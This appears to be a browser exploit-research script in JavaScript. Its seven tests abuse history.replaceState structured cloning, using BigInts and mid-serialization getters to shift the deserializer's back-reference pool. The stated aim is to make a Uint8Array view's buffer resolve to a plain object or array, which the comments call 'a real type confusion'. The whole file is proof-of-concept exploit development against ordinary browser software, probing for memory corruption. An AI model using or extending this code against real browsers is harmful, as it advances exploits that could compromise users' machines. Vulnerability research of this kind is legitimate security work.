// SC dynamic shift control — getter changes BigInt count mid-serialize
// Goal: make a TypedArray view's buffer back-ref resolve to a non-ArrayBuffer
// which could create a real type confusion in the deserializer
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

function hexDump(view, off, len) {
  var h = '';
  for (var i = off; i < Math.min(off + len, view.length); i++)
    h += view[i].toString(16).padStart(2, '0');
  return h;
}

// ─── Test 1: Getter ADDS BigInts to increase shift ───
// Normal shift=1 (one BigInt). Getter adds 2 more → shift=3.
// With shift=3, view's buffer ref overshoots by 2 extra slots.
test('shift_increase', function() {
  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xAA);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xBB);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  var decoy1 = { type: 'decoy1', val: 111 };
  var decoy2 = { type: 'decoy2', val: 222 };

  var triggered = false;
  var trigger = {};
  Object.defineProperty(trigger, 'x', {
    get: function() {
      if (!triggered) {
        triggered = true;
        // Add 2 more BigInts AFTER current position
        // These will be serialized but not added to deserializer pool
        filler[6] = 99n;
        filler[7] = 100n;
      }
      return 1;
    },
    enumerable: true
  });

  // Layout: [1n, trigger, target, v1, v2, decoy1, placeholder1, placeholder2, decoy2, ...]
  // Serializer order: 1n(shift+1), trigger(getter fires→filler[6]=99n, filler[7]=100n),
  //   target(pool), v1(pool+bufref), v2(pool+bufref), decoy1(pool),
  //   99n(shift+1), 100n(shift+1), decoy2(pool), ...
  // Total shift = 3 for refs after position 7
  // But v1 and v2 are before position 6, so shift=1 for them
  var filler = [1n, trigger, target, v1, v2, decoy1, 'placeholder1', 'placeholder2', decoy2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null' };

  var f = c[0];
  var viewResults = [];
  for (var i = 0; i < Math.min(12, f.length); i++) {
    var item = f[i];
    if (item instanceof Uint8Array) {
      viewResults.push({ idx: i, byte0: item[0], len: item.length, bufLen: item.buffer.byteLength });
    } else if (item instanceof ArrayBuffer) {
      viewResults.push({ idx: i, type: 'AB', len: item.byteLength, byte0: new Uint8Array(item)[0] });
    } else if (typeof item === 'bigint') {
      viewResults.push({ idx: i, type: 'bigint', val: String(item) });
    } else if (typeof item === 'object' && item !== null) {
      viewResults.push({ idx: i, type: 'obj', keys: Object.keys(item).slice(0, 3) });
    } else {
      viewResults.push({ idx: i, type: typeof item, val: String(item).substring(0, 20) });
    }
  }

  return {
    result: 'shift_increase',
    triggered: triggered,
    items: viewResults,
    mismatch: c[1] !== c[2]
  };
});

// ─── Test 2: Getter REMOVES BigInts to decrease shift ───
// Start with 3 BigInts (shift=3). Getter replaces 2 with strings → shift=1.
// Views positioned for shift=3 now only get shift=1 → different target.
test('shift_decrease', function() {
  var buf_a = new ArrayBuffer(64);
  new Uint8Array(buf_a).fill(0x11);
  var buf_b = new ArrayBuffer(64);
  new Uint8Array(buf_b).fill(0x22);
  var buf_c = new ArrayBuffer(64);
  new Uint8Array(buf_c).fill(0x33);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0x44);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  var triggered = false;
  var trigger = {};
  Object.defineProperty(trigger, 'x', {
    get: function() {
      if (!triggered) {
        triggered = true;
        // Remove 2 BigInts from upcoming slots
        filler[5] = 'was_bigint_2';
        filler[6] = 'was_bigint_3';
      }
      return 1;
    },
    enumerable: true
  });

  // Layout: [1n, trigger, buf_a, buf_b, buf_c, 2n, 3n, source, v1, v2, ...]
  // Without getter: shift=3, v2.buf ref shifted by 3
  // With getter: 2n and 3n replaced with strings → shift=1, v2.buf ref shifted by 1
  // With shift=1: v2 should point to buf_a (standard confusion)
  // With shift=3: v2 would point to buf_c (if they stayed)
  var filler = [1n, trigger, buf_a, buf_b, buf_c, 2n, 3n, source, v1, v2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null' };

  var f = c[0];
  var viewInfo = [];
  for (var i = 0; i < Math.min(12, f.length); i++) {
    var item = f[i];
    if (item instanceof Uint8Array) {
      viewInfo.push({ idx: i, byte0: item[0], len: item.length, bufLen: item.buffer.byteLength });
    } else if (item instanceof ArrayBuffer) {
      viewInfo.push({ idx: i, type: 'AB', byte0: new Uint8Array(item)[0] });
    } else {
      viewInfo.push({ idx: i, type: typeof item === 'bigint' ? 'bigint' : typeof item, val: String(item).substring(0, 20) });
    }
  }

  return {
    result: 'shift_decrease',
    triggered: triggered,
    items: viewInfo,
    mismatch: c[1] !== c[2]
  };
});

// ─── Test 3: CRITICAL — shift makes view ref point to non-ArrayBuffer ───
// Place a plain object where the shifted view ref resolves.
// If deserializer doesn't validate type, it might treat the object as a buffer.
test('shift_to_object', function() {
  // We need shift=1 to make the view's buffer ref point to obj instead of buf
  var obj = { a: 1.1, b: 2.2, c: 3.3, d: 4.4, e: 5.5, f: 6.6, g: 7.7, h: 8.8 };
  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xCC);
  var view = new Uint8Array(buf);

  // Pool order (serializer): 1n(skip), obj(pool[0]), buf(pool[1]), view(pool[2], bufref→pool[1])
  // Deserialized pool: obj(pool[0]), buf(pool[1]), view(pool[2], bufref→pool[1])
  // With shift=1: bufref→pool[1] resolves to deserialized pool[1-1]=pool[0]=obj!
  // The view would have obj as its "buffer" — type confusion!
  var filler = [1n, obj, buf, view];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  try {
    history.replaceState(outer, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var f = c[0];
    var item3 = f[3]; // should be the view

    if (item3 === null || item3 === undefined) {
      return { result: 'view_null', type: typeof item3 };
    }

    if (item3 instanceof Uint8Array) {
      return {
        result: 'view_ok',
        byte0: item3[0],
        len: item3.length,
        bufLen: item3.buffer.byteLength,
        bufIsObj: !(item3.buffer instanceof ArrayBuffer)
      };
    }

    // Maybe it became something else?
    return {
      result: 'view_transformed',
      type: typeof item3,
      isU8: item3 instanceof Uint8Array,
      isAB: item3 instanceof ArrayBuffer,
      ctor: item3 && item3.constructor ? item3.constructor.name : '?',
      preview: JSON.stringify(item3).substring(0, 100)
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 100) };
  }
});

// ─── Test 4: Same as test 3 but with more pool entries to test various shifts ───
test('shift_to_object_v2', function() {
  // Try shift=1 with obj at pool[0], buf at pool[1]
  // The view's bufref in serializer points to buf (pool index 2 in serializer's pool)
  // But serializer pool includes BigInt → index 2 = buf
  // Deserializer pool doesn't include BigInt → index 2 = view itself? No...

  // Let me be more precise:
  // Serializer encounters: 1n, obj, buf, view(of buf)
  // Serializer pool: [filler_array, outer_array, 1n?, obj, buf, view, ...rest]
  // Actually the pool includes ALL objects visited, including the arrays themselves

  // Let me use a simpler structure to control pool indices exactly
  // Just use history.replaceState with a flat array

  var obj = { x: new ArrayBuffer(16), y: 3.14, z: [1.1, 2.2, 3.3, 4.4] };
  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xDD);
  var view = new Uint8Array(buf);

  // Simplest: [1n, obj, buf, view]
  var data = [1n, obj, buf, view];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var items = [];
    for (var i = 0; i < c.length; i++) {
      var item = c[i];
      if (item instanceof Uint8Array) {
        items.push({ i: i, t: 'U8', byte0: item[0], len: item.length, bufLen: item.buffer.byteLength });
      } else if (item instanceof ArrayBuffer) {
        items.push({ i: i, t: 'AB', len: item.byteLength });
      } else if (typeof item === 'bigint') {
        items.push({ i: i, t: 'BI', val: String(item) });
      } else if (typeof item === 'object' && item !== null) {
        items.push({ i: i, t: 'obj', keys: Object.keys(item).slice(0, 5), ctor: item.constructor ? item.constructor.name : '?' });
      } else {
        items.push({ i: i, t: typeof item });
      }
    }

    // Check if view at c[3] has its buffer pointing to obj somehow
    if (c[3] instanceof Uint8Array) {
      var v = c[3];
      var bufMatch = 'unknown';
      if (v.buffer === c[2]) bufMatch = 'buf_correct';
      else {
        // Check if buffer matches obj's internal buffer
        if (c[1] && c[1].x instanceof ArrayBuffer && v.buffer === c[1].x) bufMatch = 'obj_inner_buf';
        else bufMatch = 'other_buf';
      }
      items.push({ check: 'view_buf', match: bufMatch, vByte0: v[0], vBufLen: v.buffer.byteLength });
    }

    return { result: 'shift_obj_v2', items: items };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 100) };
  }
});

// ─── Test 5: Shift=2 — view ref skips over 2 objects ───
test('shift2_obj_target', function() {
  var sentinel = { SENTINEL: true, marker: 0xDEAD };
  var spacer = { SPACER: true };
  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xEE);
  var view = new Uint8Array(buf);

  // With 2 BigInts → shift=2
  // view's bufref should point 2 slots earlier in deserialized pool
  var data = [1n, 2n, sentinel, spacer, buf, view];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var items = [];
    for (var i = 0; i < c.length; i++) {
      var item = c[i];
      if (item instanceof Uint8Array) {
        items.push({ i: i, t: 'U8', byte0: item[0], len: item.length, bufLen: item.buffer.byteLength });
      } else if (item instanceof ArrayBuffer) {
        items.push({ i: i, t: 'AB', len: item.byteLength, byte0: new Uint8Array(item)[0] });
      } else if (typeof item === 'bigint') {
        items.push({ i: i, t: 'BI' });
      } else if (typeof item === 'object' && item !== null) {
        items.push({ i: i, t: 'obj', keys: Object.keys(item).slice(0, 3) });
      } else {
        items.push({ i: i, t: typeof item });
      }
    }

    if (c[5] instanceof Uint8Array) {
      var v = c[5];
      items.push({
        check: 'view_analysis',
        byte0: v[0],
        bufLen: v.buffer.byteLength,
        bufIsBuf: v.buffer === c[4],
        bufIsSentinel: v.buffer === c[2],
        bufIsSpacer: v.buffer === c[3]
      });
    } else if (c[5] === null) {
      items.push({ check: 'view_null' });
    } else {
      items.push({ check: 'view_other', type: typeof c[5], ctor: c[5] && c[5].constructor ? c[5].constructor.name : '?' });
    }

    return { result: 'shift2_obj', items: items };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 100) };
  }
});

// ─── Test 6: What happens when view bufref resolves to array? ───
test('shift_to_array', function() {
  var arr = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8];
  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xFF);
  var view = new Uint8Array(buf);

  var data = [1n, arr, buf, view];

  try {
    history.replaceState(data, '');
    var c = history.state;
    history.replaceState(null, '');
    if (!c) return { result: 'null' };

    var v = c[3];
    if (v === null || v === undefined) return { result: 'view_null' };

    if (v instanceof Uint8Array) {
      // Read raw bytes via Uint32Array to bypass NaN canonicalization
      var u32 = new Uint32Array(v.buffer);
      var hexVals = [];
      for (var i = 0; i < Math.min(8, u32.length); i++) {
        hexVals.push('0x' + (u32[i] >>> 0).toString(16).padStart(8, '0'));
      }

      return {
        result: 'view_exists',
        byte0: v[0],
        len: v.length,
        bufLen: v.buffer.byteLength,
        bufIsArr: v.buffer === c[1],
        bufIsBuf: v.buffer === c[2],
        u32vals: hexVals,
        rawHex: hexDump(v, 0, 32)
      };
    }

    return {
      result: 'view_wrong_type',
      type: typeof v,
      ctor: v && v.constructor ? v.constructor.name : '?'
    };
  } catch(e) {
    return { result: 'error', msg: e.message.substring(0, 100) };
  }
});

// ─── Test 7: Precise pool index mapping ───
// Determine exact pool indices by using known back-references
test('pool_map', function() {
  var a = {};
  var b = {};
  var c_obj = {};
  var buf = new ArrayBuffer(32);
  new Uint8Array(buf).fill(0x77);
  var view = new Uint8Array(buf);

  // No BigInts — establish baseline pool mapping
  var data = [a, b, c_obj, buf, view, a, b, c_obj, buf];
  // Slots 5-8 are back-references to slots 0-3

  history.replaceState(data, '');
  var r = history.state;
  history.replaceState(null, '');
  if (!r) return { result: 'null' };

  var baseline = {
    slot5_is_slot0: r[5] === r[0],
    slot6_is_slot1: r[6] === r[1],
    slot7_is_slot2: r[7] === r[2],
    slot8_is_slot3: r[8] === r[3],
    view_buf_is_slot3: r[4] instanceof Uint8Array ? r[4].buffer === r[3] : false
  };

  // Now with 1 BigInt at the start — what shifts?
  var data2 = [1n, a, b, c_obj, buf, view, a, b, c_obj, buf];

  history.replaceState(data2, '');
  var r2 = history.state;
  history.replaceState(null, '');
  if (!r2) return { result: 'null2' };

  var shifted = {
    view_byte0: r2[5] instanceof Uint8Array ? r2[5][0] : -1,
    view_bufLen: r2[5] instanceof Uint8Array ? r2[5].buffer.byteLength : -1,
    slot6_is_slot1: r2[6] === r2[1],
    slot7_is_slot2: r2[7] === r2[2],
    slot8_is_slot3: r2[8] === r2[3],
    slot6_eq_slot0: r2[6] === r2[0],
    view_buf_is_slot3: r2[5] instanceof Uint8Array ? r2[5].buffer === r2[4] : false,
    view_buf_is_slot1: r2[5] instanceof Uint8Array && r2[1] instanceof ArrayBuffer ? r2[5].buffer === r2[1] : false
  };

  // Check what each back-ref actually resolved to
  var refMap = [];
  for (var i = 6; i <= 9; i++) {
    if (i >= r2.length) break;
    var item = r2[i];
    var matchIdx = -1;
    for (var j = 0; j < 6; j++) {
      if (r2[i] === r2[j]) { matchIdx = j; break; }
    }
    refMap.push({ slot: i, matchesSlot: matchIdx, type: typeof item, isAB: item instanceof ArrayBuffer, isU8: item instanceof Uint8Array });
  }

  return {
    result: 'pool_map',
    baseline: baseline,
    shifted: shifted,
    refMap: refMap
  };
});

return JSON.stringify(results);
})();
